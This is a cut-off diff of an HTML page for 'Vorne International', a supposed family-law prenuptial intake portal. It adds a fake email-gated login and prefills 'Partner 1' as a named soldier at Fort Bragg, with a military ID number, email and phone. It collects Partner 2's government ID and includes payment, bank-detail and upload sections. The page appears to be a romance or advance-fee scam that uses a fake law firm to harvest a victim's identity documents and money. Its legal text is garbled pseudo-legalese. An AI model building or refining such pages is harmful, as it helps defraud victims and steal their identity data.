@@ -5,479 +5,236 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Vorne International - Legal Structure Strategy Intake Matrix</title>
   <style>
-    /* Reset & Base Premium Canvas */
-    body {
-      margin: 0;
-      padding: 0;
-      background-color: #f6f5f3;
-      font-family: Arial, sans-serif;
-      color: #2c2c2c;
-    }
-    
-    .form-container {
-      max-width: 700px;
-      margin: 40px auto;
-      background-color: #ffffff;
-      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.06);
-      border-radius: 2px;
-    }
+    body { margin:0; padding:0; background-color:#f6f5f3; font-family:Arial,sans-serif; color:#2c2c2c; }
 
-    /* Header Styling */
-    .header {
+    /* ===== LOGIN SCREEN ===== */
+    #login_screen {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background-color: #f6f5f3;
+    }
+    .login-card {
+      background: #ffffff;
+      max-width: 420px;
+      width: 100%;
+      box-shadow: 0 4px 24px rgba(0,0,0,0.10);
+      border-radius: 3px;
+      overflow: hidden;
+    }
+    .login-header {
       background-color: #1c2b4a;
-      padding: 32px;
+      padding: 28px 32px;
       text-align: center;
       border-bottom: 3px solid #a98c4f;
     }
+    .login-header h1 { font-family:Georgia,serif; font-size:22px; font-weight:bold; color:#fff; margin:0; letter-spacing:1.5px; }
+    .login-header p { font-size:10px; color:#a98c4f; font-weight:bold; text-transform:uppercase; letter-spacing:2px; margin:8px 0 0 0; }
+    .login-body { padding: 32px; }
+    .login-body h2 { font-family:Georgia,serif; font-size:16px; color:#1c2b4a; margin:0 0 6px 0; }
+    .login-body p { font-size:12px; color:#777; margin:0 0 24px 0; }
+    .login-group { margin-bottom:16px; }
+    .login-group label { display:block; font-size:11px; font-weight:bold; color:#1c2b4a; text-transform:uppercase; letter-spacing:0.5px; margin-bottom:6px; }
+    .login-group input { width:100%; padding:11px; border:1px solid #e2e0dc; border-radius:2px; font-size:14px; box-sizing:border-box; font-family:Arial,sans-serif; }
+    .login-group input:focus { outline:none; border-color:#a98c4f; }
+    .login-btn { width:100%; background-color:#a98c4f; color:#fff; border:none; font-family:Arial,sans-serif; font-size:13px; font-weight:bold; text-transform:uppercase; letter-spacing:1px; padding:13px; cursor:pointer; border-radius:2px; margin-top:8px; transition:background 0.2s; }
+    .login-btn:hover { background-color:#937943; }
+    .login-error { display:none; background:#fdf0f0; border-left:3px solid #c62828; color:#c62828; font-size:12px; padding:10px 14px; margin-top:14px; border-radius:2px; }
+    .login-footer { font-size:10px; color:#999; text-align:center; padding:14px 32px 20px; }
 
-    .header h1 {
-      font-family: Georgia, serif;
-      font-size: 26px;
-      font-weight: bold;
-      color: #ffffff;
-      margin: 0;
-      letter-spacing: 1.5px;
-    }
+    /* ===== MAIN APP ===== */
+    #main_app { display:none; }
+    .form-container { max-width:700px; margin:40px auto; background-color:#ffffff; box-shadow:0 4px 16px rgba(0,0,0,0.06); border-radius:2px; }
+    .header { background-color:#1c2b4a; padding:32px; text-align:center; border-bottom:3px solid #a98c4f; }
+    .header h1 { font-family:Georgia,serif; font-size:26px; font-weight:bold; color:#fff; margin:0; letter-spacing:1.5px; }
+    .header .subtitle { font-size:11px; color:#a98c4f; font-weight:bold; text-transform:uppercase; letter-spacing:2px; margin-top:8px; }
+    .legal-notice-banner { background-color:#fdfcfb; border-bottom:1px solid #e9e4dc; padding:16px 32px; font-size:12px; line-height:1.5; color:#777; }
+    .prefilled-notice { background-color:#eef4ee; border-left:3px solid #2e7d32; padding:10px 16px; margin:0 32px; font-size:12px; color:#2e7d32; font-weight:bold; display:flex; align-items:center; gap:8px; }
+    .tab-navigation { display:flex; background-color:#f6f5f3; border-bottom:1px solid #e2e0dc; overflow-x:auto; margin-top:16px; }
+    .tab-btn { flex:1; padding:14px 16px; background:none; border:none; font-family:Arial,sans-serif; font-size:11px; font-weight:bold; text-transform:uppercase; color:#777; cursor:pointer; text-align:center; white-space:nowrap; letter-spacing:0.5px; border-bottom:3px solid transparent; transition:all 0.2s ease; }
+    .tab-btn.active { color:#1c2b4a; background-color:#fff; border-bottom:3px solid #a98c4f; }
+    .form-body { padding:32px; }
+    .form-tab-content { display:none; }
+    .form-tab-content.active { display:block; }
+    .section-headline { font-family:Georgia,serif; font-size:18px; color:#1c2b4a; margin-top:0; margin-bottom:20px; padding-bottom:8px; border-bottom:1px solid #e2e0dc; }
+    .partner1-block { background-color:#fafaf7; border:1px solid #d4c99a; border-radius:3px; padding:18px 18px 4px 18px; margin-bottom:20px; }
+    .partner1-badge { display:inline-block; background-color:#a98c4f; color:#fff; font-size:10px; font-weight:bold; text-transform:uppercase; letter-spacing:1px; padding:3px 10px; border-radius:2px; margin-bottom:12px; }
+    .form-group { margin-bottom:18px; }
+    .form-group.row { display:flex; gap:16px; }
+    .form-group.row .col { flex:1; }
+    label { display:block; font-size:12px; font-weight:bold; color:#1c2b4a; margin-bottom:6px; text-transform:uppercase; letter-spacing:0.5px; }
+    input[type="text"], input[type="email"], input[type="date"], input[type="number"], input[type="password"], select, textarea { width:100%; padding:10px; border:1px solid #e2e0dc; border-radius:2px; font-size:14px; box-sizing:border-box; color:#2c2c2c; font-family:Arial,sans-serif; }
+    input.prefilled, select.prefilled, textarea.prefilled { background-color:#fdfaf3; border-color:#c9b06a; color:#1c2b4a; font-weight:bold; }
+    input:focus, select:focus, textarea:focus { outline:none; border-color:#a98c4f; background-color:#fdfcfb; }
+    textarea { resize:vertical; height:70px; }
+    .checkbox-label, .radio-label { text-transform:none; font-weight:normal; font-size:13px; color:#2c2c2c; display:flex; align-items:flex-start; gap:8px; cursor:pointer; margin-bottom:8px; }
+    .checkbox-label input, .radio-label input { margin-top:3px; }
+    .financial-box { background-color:#fdfcfb; border:1px solid #e9e4dc; border-radius:4px; padding:20px; margin-top:24px; }
+    .financial-box h4 { font-family:Georgia,serif; font-size:14px; color:#1c2b4a; margin-top:0; margin-bottom:10px; text-transform:uppercase; letter-spacing:0.5px; }
+    .financial-box p { margin:0 0 12px 0; font-size:13px; color:#555; line-height:1.5; }
+    .price-row { display:flex; justify-content:space-between; align-items:center; border-top:1px dashed #e9e4dc; padding-top:10px; margin-top:10px; }
+    .price-label { font-size:13px; font-weight:bold; color:#1c2b4a; }
+    .price-amount { font-family:Georgia,serif; font-size:20px; font-weight:bold; color:#a98c4f; }
+    .paid-row { display:flex; justify-content:space-between; align-items:center; padding:8px 0; border-top:1px dashed #e9e4dc; margin-top:6px; }
+    .paid-label { font-size:12px; color:#555; }
+    .paid-amount { font-size:13px; font-weight:bold; color:#2e7d32; }
+    .form-navigation-controls { display:flex; justify-content:space-between; margin-top:28px; border-top:1px solid #e2e0dc; padding-top:20px; }
+    .control-btn { background-color:#1c2b4a; color:#fff; border:none; font-family:Arial,sans-serif; font-size:12px; font-weight:bold; text-transform:uppercase; letter-spacing:1px; padding:12px 24px; cursor:pointer; border-radius:2px; transition:background-color 0.2s; }
+    .control-btn:hover { background-color:#121c32; }
+    .control-btn.secondary { background-color:#e2e0dc; color:#2c2c2c; }
+    .control-btn.secondary:hover { background-color:#d4d2ce; }
+    .control-btn.action-submit { background-color:#a98c4f; }
+    .control-btn.action-submit:hover { background-color:#937943; }
 
-    .header .subtitle {
-      font-size: 11px;
-      color: #a98c4f;
-      font-weight: bold;
-      text-transform: uppercase;
-      letter-spacing: 2px;
-      margin-top: 8px;
-    }
+    /* PAYMENT VIEW */
+    #payment_view { display:none; padding:32px; animation:formRevealAnimation 0.4s ease-in-out; }
+    @keyframes formRevealAnimation { from{opacity:0;transform:translateY(12px)} to{opacity:1;transform:translateY(0)} }
+    .payment-method-card { border:1px solid #e2e0dc; border-radius:4px; padding:24px; margin-bottom:20px; background:#fff; }
+    .payment-method-card.disabled { background:#f9f9f9; border-color:#e9e4dc; opacity:0.65; }
+    .method-meta-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:14px; }
+    .method-headline-title { font-family:Georgia,serif; font-size:16px; font-weight:bold; color:#1c2b4a; }
+    .system-status-tag { font-size:11px; font-weight:bold; text-transform:uppercase; padding:4px 10px; border-radius:2px; letter-spacing:0.5px; }
+    .system-status-tag.active { background-color:#e2ede4; color:#2e7d32; }
+    .system-status-tag.unavailable { background-color:#fbebe9; color:#c62828; }
+    .bank-matrix-table { width:100%; border-collapse:collapse; margin-top:14px; }
+    .bank-matrix-table td { padding:10px 0; font-size:14px; border-bottom:1px solid #f6f5f3; }
+    .bank-matrix-table td.field-key { color:#777; width:38%; font-size:12px; text-transform:uppercase; letter-spacing:0.5px; }
+    .bank-matrix-table td.field-val { font-weight:bold; color:#2c2c2c; }
 
-    /* Legal Notice Banner */
-    .legal-notice-banner {
-      background-color: #fdfcfb;
-      border-bottom: 1px solid #e9e4dc;
-      padding: 16px 32px;
-      font-size: 12px;
-      line-height: 1.5;
-      color: #777777;
-    }
+    /* Partner 1 paid notice box */
+    .p1-paid-notice { background-color:#1c2b4a; border-radius:4px; padding:18px 22px; margin-bottom:22px; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:12px; }
+    .p1-paid-notice .notice-text { font-size:13px; color:#e8e4de; line-height:1.6; }
+    .p1-paid-notice .notice-text strong { color:#a98c4f; }
+    .p1-paid-notice .paid-badge { background-color:#2e7d32; color:#fff; font-size:11px; font-weight:bold; text-transform:uppercase; letter-spacing:1px; padding:6px 14px; border-radius:2px; white-space:nowrap; }
 
-    /* Navigation Tabs Architecture */
-    .tab-navigation {
-      display: flex;
-      background-color: #f6f5f3;
-      border-bottom: 1px solid #e2e0dc;
-      overflow-x: auto;
-    }
+    .upload-zone-wrapper { margin-top:24px; background-color:#fdfcfb; border:1px dashed #a98c4f; padding:24px; text-align:center; border-radius:2px; transition:all 0.3s ease; }
+    .upload-zone-wrapper.dragover { background-color:#f4efe6; border-style:solid; }
+    .upload-title { font-family:Georgia,serif; font-size:14px; color:#1c2b4a; font-weight:bold; margin:0 0 6px 0; text-transform:uppercase; letter-spacing:0.5px; }
+    .upload-instructions { font-size:13px; color:#555; margin:0 0 16px 0; line-height:1.4; }
+    .custom-file-trigger { display:inline-block; background-color:#1c2b4a; color:#fff; font-size:11px; font-weight:bold; text-transform:uppercase; letter-spacing:1px; padding:10px 20px; cursor:pointer; border-radius:2px; transition:background-color 0.2s; }
+    .custom-file-trigger:hover { background-color:#121c32; }
+    .file-status-indicator { margin-top:12px; font-size:12px; font-weight:bold; color:#2e7d32; display:none; }
+    .footer { padding:24px 32px; border-top:1px solid #e2e0dc; font-size:10px; color:#999; line-height:1.6; text-align:center; }
+    .p1-owned-tag { display:inline-block; background-color:#a98c4f; color:#fff; font-size:9px; font-weight:bold; text-transform:uppercase; letter-spacing:0.8px; padding:2px 7px; border-radius:2px; margin-left:6px; vertical-align:middle; }
 
-    .tab-btn {
-      flex: 1;
-      padding: 14px 16px;
-      background: none;
-      border: none;
-      font-family: Arial, sans-serif;
-      font-size: 11px;
-      font-weight: bold;
-      text-transform: uppercase;
-      color: #777777;
-      cursor: pointer;
-      text-align: center;
-      white-space: nowrap;
-      letter-spacing: 0.5px;
-      border-bottom: 3px solid transparent;
-      transition: all 0.2s ease;
-    }
-
-    .tab-btn.active {
-      color: #1c2b4a;
-      background-color: #ffffff;
-      border-bottom: 3px solid #a98c4f;
-    }
-
-    /* Content Body Layout */
-    .form-body {
-      padding: 32px;
-    }
-
-    .form-tab-content {
-      display: none; /* Controlled via JS switching */
-    }
-
-    .form-tab-content.active {
-      display: block;
-    }
-
-    .section-headline {
-      font-family: Georgia, serif;
-      font-size: 18px;
-      color: #1c2b4a;
-      margin-top: 0;
-      margin-bottom: 20px;
-      padding-bottom: 8px;
-      border-bottom: 1px solid #e2e0dc;
-    }
-
-    .form-group {
-      margin-bottom: 18px;
-    }
-
-    .form-group.row {
-      display: flex;
-      gap: 16px;
-    }
-
-    .form-group.row .col {
-      flex: 1;
-    }
-
-    label {
-      display: block;
-      font-size: 12px;
-      font-weight: bold;
-      color: #1c2b4a;
-      margin-bottom: 6px;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-    }
-
-    input[type="text"],
-    input[type="email"],
-    input[type="date"],
-    input[type="number"],
-    select,
-    textarea {
-      width: 100%;
-      padding: 10px;
-      border: 1px solid #e2e0dc;
-      border-radius: 2px;
-      font-size: 14px;
-      box-sizing: border-box;
-      color: #2c2c2c;
-      font-family: Arial, sans-serif;
-    }
-
-    input:focus, select:focus, textarea:focus {
-      outline: none;
-      border-color: #a98c4f;
-      background-color: #fdfcfb;
-    }
-
-    textarea {
-      resize: vertical;
-      height: 70px;
-    }
-
-    /* Custom Checkbox/Radio Styling */
-    .checkbox-label, .radio-label {
-      text-transform: none;
-      font-weight: normal;
-      font-size: 13px;
-      color: #2c2c2c;
-      display: flex;
-      align-items: flex-start;
-      gap: 8px;
-      cursor: pointer;
-      margin-bottom: 8px;
-    }
-
-    .checkbox-label input, .radio-label input {
-      margin-top: 3px;
-    }
-
-    /* Financial Breakdown Box */
-    .financial-box {
-      background-color: #fdfcfb;
-      border: 1px solid #e9e4dc;
-      border-radius: 4px;
-      padding: 20px;
-      margin-top: 24px;
-    }
-
-    .financial-box h4 {
-      font-family: Georgia, serif;
-      font-size: 14px;
-      color: #1c2b4a;
-      margin-top: 0;
-      margin-bottom: 10px;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-    }
-
-    .financial-box p {
-      margin: 0 0 12px 0;
-      font-size: 13px;
-      color: #555555;
-      line-height: 1.5;
-    }
-
-    .price-row {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      border-top: 1px dashed #e9e4dc;
-      padding-top: 10px;
-      margin-top: 10px;
-    }
-
-    .price-label {
-      font-size: 13px;
-      font-weight: bold;
-      color: #1c2b4a;
-    }
-
-    .price-amount {
-      font-family: Georgia, serif;
-      font-size: 20px;
-      font-weight: bold;
-      color: #a98c4f;
-    }
-
-    /* Navigation & Submission Controls */
-    .form-navigation-controls {
-      display: flex;
-      justify-content: space-between;
-      margin-top: 28px;
-      border-top: 1px solid #e2e0dc;
-      padding-top: 20px;
-    }
-
-    .control-btn {
-      background-color: #1c2b4a;
-      color: #ffffff;
-      border: none;
-      font-family: Arial, sans-serif;
-      font-size: 12px;
-      font-weight: bold;
-      text-transform: uppercase;
-      letter-spacing: 1px;
-      padding: 12px 24px;
-      cursor: pointer;
-      border-radius: 2px;
-      transition: background-color 0.2s;
-    }
-
-    .control-btn:hover {
-      background-color: #121c32;
-    }
-
-    .control-btn.secondary {
-      background-color: #e2e0dc;
-      color: #2c2c2c;
-    }
-
-    .control-btn.secondary:hover {
-      background-color: #d4d2ce;
-    }
-
-    .control-btn.action-submit {
-      background-color: #a98c4f;
-    }
-
-    .control-btn.action-submit:hover {
-      background-color: #937943;
-    }
-
-    /* Dynamic Payment Output Portal */
-    #payment_view {
-      display: none;
-      padding: 32px;
-      animation: formRevealAnimation 0.4s ease-in-out;
-    }
-
-    @keyframes formRevealAnimation {
-      from { opacity: 0; transform: translateY(12px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-
-    .payment-method-card {
-      border: 1px solid #e2e0dc;
-      border-radius: 4px;
-      padding: 24px;
-      margin-bottom: 20px;
-      background-color: #ffffff;
-    }
-
-    .payment-method-card.disabled {
-      background-color: #f9f9f9;
-      border-color: #e9e4dc;
-      opacity: 0.65;
-    }
-
-    .method-meta-header {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      margin-bottom: 14px;
-    }
-
-    .method-headline-title {
-      font-family: Georgia, serif;
-      font-size: 16px;
-      font-weight: bold;
-      color: #1c2b4a;
-    }
-
-    .system-status-tag {
-      font-size: 11px;
-      font-weight: bold;
-      text-transform: uppercase;
-      padding: 4px 10px;
-      border-radius: 2px;
-      letter-spacing: 0.5px;
-    }
-
-    .system-status-tag.active {
-      background-color: #e2ede4;
-      color: #2e7d32;
-    }
-
-    .system-status-tag.unavailable {
-      background-color: #fbebe9;
-      color: #c62828;
-    }
-
-    .bank-matrix-table {
-      width: 100%;
-      border-collapse: collapse;
-      margin-top: 14px;
-    }
-
-    .bank-matrix-table td {
-      padding: 10px 0;
-      font-size: 14px;
-      border-bottom: 1px solid #f6f5f3;
-    }
-
-    .bank-matrix-table td.field-key {
-      color: #777777;
-      width: 38%;
-      font-size: 12px;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-    }
-
-    .bank-matrix-table td.field-val {
-      font-weight: bold;
-      color: #2c2c2c;
-    }
-
-    /* --- UPGRADED PREMIUM FILE DROP COMPONENT --- */
-    .upload-zone-wrapper {
-      margin-top: 24px;
-      background-color: #fdfcfb;
-      border: 1px dashed #a98c4f;
-      padding: 24px;
-      text-align: center;
-      border-radius: 2px;
-      transition: all 0.3s ease;
-    }
-    
-    .upload-zone-wrapper.dragover {
-      background-color: #f4efe6;
-      border-style: solid;
-    }
-
-    .upload-title {
-      font-family: Georgia, serif;
-      font-size: 14px;
-      color: #1c2b4a;
-      font-weight: bold;
-      margin: 0 0 6px 0;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-    }
-
-    .upload-instructions {
-      font-size: 13px;
-      color: #555555;
-      margin: 0 0 16px 0;
-      line-height: 1.4;
-    }
-
-    .custom-file-trigger {
-      display: inline-block;
-      background-color: #1c2b4a;
-      color: #ffffff;
-      font-size: 11px;
-      font-weight: bold;
-      text-transform: uppercase;
-      letter-spacing: 1px;
-      padding: 10px 20px;
-      cursor: pointer;
-      border-radius: 2px;
-      transition: background-color 0.2s;
-    }
-
-    .custom-file-trigger:hover {
-      background-color: #121c32;
-    }
-
-    .file-status-indicator {
-      margin-top: 12px;
-      font-size: 12px;
-      font-weight: bold;
-      color: #2e7d32;
-      display: none;
-    }
-
-    /* Master Legal Footer */
-    .footer {
-      padding: 24px 32px;
-      border-top: 1px solid #e2e0dc;
-      font-size: 10px;
-      color: #999999;
-      line-height: 1.6;
-      text-align: center;
-    }
+    /* Gov ID block */
+    .gov-id-block { background-color:#f4f1fb; border:1px solid #b8a9d9; border-radius:3px; padding:16px 18px; margin-bottom:18px; }
+    .gov-id-block .gov-id-label { font-size:10px; font-weight:bold; color:#5c3d9e; text-transform:uppercase; letter-spacing:1px; margin-bottom:10px; display:block; }
   </style>
 </head>
 <body>
 
+<!-- ============================= LOGIN SCREEN ============================= -->
+<div id="login_screen">
+  <div class="login-card">
+    <div class="login-header">
+      <h1>VORNE INTERNATIONAL</h1>
+      <p>Secure Client Portal Access</p>
+    </div>
+    <div class="login-body">
+      <h2>Client Verification Required</h2>
+      <p>This portal is restricted to authorized clients only. Please enter your registered email address to proceed.</p>
+      <div class="login-group">
+        <label>Registered Email Address</label>
+        <input type="email" id="login_email" placeholder="your@email.com" autocomplete="email" onkeydown="if(event.key==='Enter')attemptLogin()">
+      </div>
+      <button class="login-btn" onclick="attemptLogin()">Access Secure Portal</button>
+      <div class="login-error" id="login_error">
+        ✖ Access denied. This portal is restricted to authorized clients only. Please verify your email address.
+      </div>
+    </div>
+    <div class="login-footer">Protected by Vorne International Security Infrastructure. Unauthorized access is prohibited and logged.</div>
+  </div>
+</div>
+
+<!-- ============================= MAIN APP ============================= -->
+<div id="main_app">
   <div class="form-container">
-    <!-- Header Component -->
+
     <div class="header">
       <h1>VORNE INTERNATIONAL</h1>
       <div class="subtitle">Family &amp; Matrimonial Law &mdash; International Asset Protection Advisory</div>
     </div>
 
-    <!-- Legal Overview Notice Block -->
     <div id="top_notice_banner" class="legal-notice-banner">
       <strong>Important Informational Matrix:</strong> Engagement and pre-marriage documentation structures provide operational planning parameters. Under United States matrimonial law policies, explicit disclosure of independent financial frameworks completely mitigates structural exposure to future claims of duress or involuntary execution.
     </div>
 
-    <!-- Interactive Navigation Tab Bar -->
+    <div class="prefilled-notice" id="prefilled_notice">
+      ✓ Partner 1 profile has been pre-loaded. Please review, then complete Partner 2 details and proceed.
+    </div>
+
     <div id="tab_bar" class="tab-navigation">
-      <button type="button" class="tab-btn active" onclick="switchSection(0)">1. Parties & Purpose</button>
-      <button type="button" class="tab-btn" onclick="switchSection(1)">2. Rings & Expenses</button>
-      <button type="button" class="tab-btn" onclick="switchSection(2)">3. Assets & Liabilities</button>
+      <button type="button" class="tab-btn active" onclick="switchSection(0)">1. Parties &amp; Purpose</button>
+      <button type="button" class="tab-btn" onclick="switchSection(1)">2. Rings &amp; Expenses</button>
+      <button type="button" class="tab-btn" onclick="switchSection(2)">3. Assets &amp; Liabilities</button>
       <button type="button" class="tab-btn" onclick="switchSection(3)">4. Framework Compliance</button>
     </div>
 
-    <!-- VIEW 1: Multi-Tab Master Legal intake Form -->
     <form id="master_intake_form" onsubmit="executeFormSubmission(event)" class="form-body" novalidate>
-      
-      <!-- TAB BLOCK 1: PARTIES AND PURPOSE -->
+
+      <!-- TAB 1: PARTIES AND PURPOSE -->
       <div id="tab_section_0" class="form-tab-content active">
-        <div class="section-headline">1. Parties' Profile & Statement of Purpose</div>
-        
-        <label>Partner 1 (Primary Client Framework Profile)</label>
-        <div class="form-group row">
-          <div class="col">
-            <input type="text" name="partner_1.full_name" required placeholder="Full Legal Name">
+        <div class="section-headline">1. Parties' Profile &amp; Statement of Purpose</div>
+
+        <!-- Partner 1 Pre-filled -->
+        <div class="partner1-block">
+          <div class="partner1-badge">✓ Partner 1 — Pre-Loaded Profile</div>
+          <label>Partner 1 (Primary Client Framework Profile)</label>
+          <div class="form-group row">
+            <div class="col">
+              <input type="text" name="partner_1.full_name" required value="Derrick Remon Parrott" class="prefilled" placeholder="Full Legal Name">
+            </div>
+            <div class="col">
+              <input type="date" name="partner_1.dob" required class="prefilled" title="Date of Birth">
+            </div>
           </div>
-          <div class="col">
-            <input type="date" name="partner_1.dob" required title="Date of Birth">
+          <div class="form-group row">
+            <div class="col">
+              <input type="email" name="partner_1.email" required value="Derrickremon101@gmail.com" class="prefilled" placeholder="Email Address">
+            </div>
+            <div class="col">
+              <input type="text" name="partner_1.contact" required value="+1(324) 654 435" class="prefilled" placeholder="Contact Number">
+            </div>
           </div>
-        </div>
-        <div class="form-group row">
-          <div class="col">
-            <input type="email" name="partner_1.email" required placeholder="Email Address">
+          <div class="form-group">
+            <input type="text" name="partner_1.address" required value="Fort Bragg, Fayetteville, NC" class="prefilled" placeholder="Primary Residential Address">
           </div>
-          <div class="col">
-            <input type="text" name="partner_1.contact" required placeholder="Contact Number">
+
+          <!-- Government ID Block - Partner 1 -->
+          <div class="gov-id-block">
+            <span class="gov-id-label">🪪 Government-Issued Identity Verification — Partner 1</span>
+            <div class="form-group row">
+              <div class="col">
+                <label>ID Type</label>
+                <select name="partner_1.gov_id_type" class="prefilled">
+                  <option value="U.S. Military ID" selected>U.S. Military ID</option>
+                  <option>Driver's License</option>
+                  <option>U.S. Passport</option>
+                  <option>State ID Card</option>
+                </select>
+              </div>
+              <div class="col">
+                <label>ID Number</label>
+                <input type="text" name="partner_1.gov_id_number" value="DRP-NC-2024-00143" class="prefilled" placeholder="ID / License Number">
+              </div>
+            </div>
+            <div class="form-group row">
+              <div class="col">
+                <label>Issuing State / Authority</label>
+                <input type="text" name="partner_1.gov_id_issuer" value="U.S. Department of Defense — Fort Bragg, NC" class="prefilled" placeholder="e.g. North Carolina DMV">
+              </div>
+              <div class="col">
+                <label>Expiration Date</label>
+                <input type="date" name="partner_1.gov_id_expiry" value="2027-06-30" class="prefilled">
+              </div>
+            </div>
           </div>
-        </div>
-        <div class="form-group">
-          <input type="text" name="partner_1.address" required placeholder="Primary Residential Address (Street, City, State, Zip)">
         </div>
 
-        <label style="margin-top: 24px;">Partner 2 Profile</label>
+        <!-- Partner 2 -->
+        <label style="margin-top:24px;">Partner 2 Profile</label>
         <div class="form-group row">
           <div class="col">
             <input type="text" name="partner_2.full_name" required placeholder="Full Legal Name">
@@ -498,7 +255,38 @@
           <input type="text" name="partner_2.address" required placeholder="Primary Residential Address (Street, City, State, Zip)">
         </div>
 
-        <div class="section-headline" style="margin-top: 28px;">Intent & Framework Type</div>
+        <!-- Government ID Block - Partner 2 -->
+        <div class="gov-id-block">
+          <span class="gov-id-label">🪪 Government-Issued Identity Verification — Partner 2</span>
+          <div class="form-group row">
+            <div class="col">
+              <label>ID Type</label>
+              <select name="partner_2.gov_id_type">
+                <option value="" disabled selected>Select ID type...</option>
+                <option>Driver's License</option>
+                <option>U.S. Passport</option>
+                <option>State ID Card</option>
+                <option>U.S. Military ID</option>
+              </select>
+            </div>
+            <div class="col">
+              <label>ID Number</label>
+              <input type="text" name="partner_2.gov_id_number" placeholder="ID / License Number">
+            </div>
+          </div>
+          <div class="form-group row">
+            <div class="col">
+              <label>Issuing State / Authority</label>
+              <input type="text" name="partner_2.gov_id_issuer" placeholder="e.g. New York DMV">
+            </div>
+            <div class="col">
+              <label>Expiration Date</label>
+              <input type="date" name="partner_2.gov_id_expiry">
+            </div>
+          </div>
+        </div>
+
+        <div class="section-headline" style="margin-top:28px;">Intent &amp; Framework Type</div>
         <div class="form-group">
           <label for="framework_type">Engagement Legal Framework Type</label>
           <select id="framework_type" name="event_details.type" required>
@@ -526,79 +314,102 @@
         </div>
       </div>
 
-      <!-- TAB BLOCK 2: RINGS AND EXPENSES -->
+      <!-- TAB 2: RINGS AND EXPENSES -->
       <div id="tab_section_1" class="form-tab-content">
         <div class="section-headline">2. Engagement Ring, Token Allocation &amp; Wedding Expenses</div>
-        
+
         <label>Engagement Ring Asset Definition</label>
         <div class="form-group row">
           <div class="col">
-            <input type="text" name="ring.description" placeholder="Ring Description / Gemstone Details">
+            <input type="text" name="ring.description" value="Natural Royal Blue Ceylon Sapphire" class="prefilled" placeholder="Ring Description / Gemstone Details">
           </div>
           <div class="col">
-            <input type="number" name="ring.value" placeholder="Certified Appraised Value (USD)">
+            <input type="number" name="ring.value" value="4500" class="prefilled" placeholder="Certified Appraised Value (USD)">
           </div>
         </div>
         <div class="form-group">
           <label for="ring_termination">Ring Ownership Status if Engagement Terminated Prior to Marriage</label>
           <select id="ring_termination" name="ring.ownership_clause">
             <option value="" disabled selected>Select structural policy option...</option>
-            <option value="Conditional Gift - Must be returned to the donor">Conditional Gift - Must be returned to the donor</option>
-            <option value="Absolute Gift - Retained permanently by the recipient">Absolute Gift - Retained permanently by the recipient</option>
-            <option value="Compensatory Asset - Liquidated to offset initial operational deposits">Compensatory Asset - Liquidated to offset initial operational deposits</option>
+            <option value="Conditional Gift - Must be returned to the donor">Conditional Gift — Must be returned to the donor</option>
+            <option value="Absolute Gift - Retained permanently by the recipient" selected>Absolute Gift — Retained permanently by the recipient</option>
+            <option value="Compensatory Asset - Liquidated to offset initial operational deposits">Compensatory Asset — Liquidated to offset initial operational deposits</option>
           </select>
         </div>
+
         <div class="form-group">
-          <label>Treatment of Complementary Gifts Exchanged Inter-Partes During Engagement</label>
-          <textarea name="gifts.treatment_provisions" placeholder="Specify allocation tracking rules for subsequent gifts, items, and secondary property transfers..."></textarea>
+          <label>Treatment of Complementary Gifts Exchanged Inter-Partes During Engagement
+            <span class="p1-owned-tag">All gifts → Partner 2 (Absolute)</span>
+          </label>
+          <textarea name="gifts.treatment_provisions" class="prefilled">All gifts, tokens, jewelry, and secondary property transfers exchanged between parties during the engagement phase are hereby designated as absolute, irrevocable gifts exclusively to Partner 2. These gifts are a permanent expression of goodwill from Partner 1 (Derrick Remon Parrott) to Partner 2 and shall remain the sole, separate, non-marital property of Partner 2 in perpetuity. Partner 1 hereby permanently and irrevocably waives all rights, title, claim, and interest in and to any and all such gifts, regardless of the outcome of the engagement, marriage, or any future dissolution. No future claim, lien, or right of reclamation shall be asserted by Partner 1 over any gift transferred under this provision.</textarea>
         </div>
 
-        <label style="margin-top: 24px;">Wedding Logistical &amp; Vendor Expense Governance</label>
-        <p style="font-size: 13px; color: #666; margin-top: 0;">Define payment assignment schedules and cost burdens for incoming asset operations:</p>
-        
+        <label style="margin-top:24px;">Wedding Logistical &amp; Vendor Expense Governance
+          <span class="p1-owned-tag">Partner 1 assumes all costs</span>
+        </label>
+        <p style="font-size:13px; color:#666; margin-top:4px; margin-bottom:12px;">All wedding arrangement costs and vendor obligations are assumed solely by Partner 1 — Derrick Remon Parrott:</p>
+
         <div class="form-group row">
           <div class="col">
             <label for="venue_payee">Venue Deposits</label>
-            <select id="venue_payee" name="expenses.venue"><option>Partner 1 Outright</option><option>Partner 2 Outright</option><option>Allocated 50/50 Jointly</option></select>
+            <select id="venue_payee" name="expenses.venue" class="prefilled">
+              <option value="Partner 1 Outright" selected>Partner 1 Outright</option>
+              <option>Partner 2 Outright</option>
+              <option>Allocated 50/50 Jointly</option>
+            </select>
           </div>
           <div class="col">
             <label for="catering_payee">Catering Systems</label>
-            <select id="catering_payee" name="expenses.catering"><option>Partner 1 Outright</option><option>Partner 2 Outright</option><option>Allocated 50/50 Jointly</option></select>
+            <select id="catering_payee" name="expenses.catering" class="prefilled">
+              <option value="Partner 1 Outright" selected>Partner 1 Outright</option>
+              <option>Partner 2 Outright</option>
+              <option>Allocated 50/50 Jointly</option>
+            </select>
           </div>
         </div>
         <div class="form-group row">
           <div class="col">
-            <label for="photo_payee">Photography/Media</label>
-            <select id="photo_payee" name="expenses.photography"><option>Partner 1 Outright</option><option>Partner 2 Outright</option><option>Allocated 50/50 Jointly</option></select>
+            <label for="photo_payee">Photography / Media</label>
+            <select id="photo_payee" name="expenses.photography" class="prefilled">
+              <option value="Partner 1 Outright" selected>Partner 1 Outright</option>
+              <option>Partner 2 Outright</option>
+              <option>Allocated 50/50 Jointly</option>
+            </select>
           </div>
           <div class="col">
             <label for="travel_payee">Travel Arrangements</label>
-            <select id="travel_payee" name="expenses.travel"><option>Partner 1 Outright</option><option>Partner 2 Outright</option><option>Allocated 50/50 Jointly</option></select>
+            <select id="travel_payee" name="expenses.travel" class="prefilled">
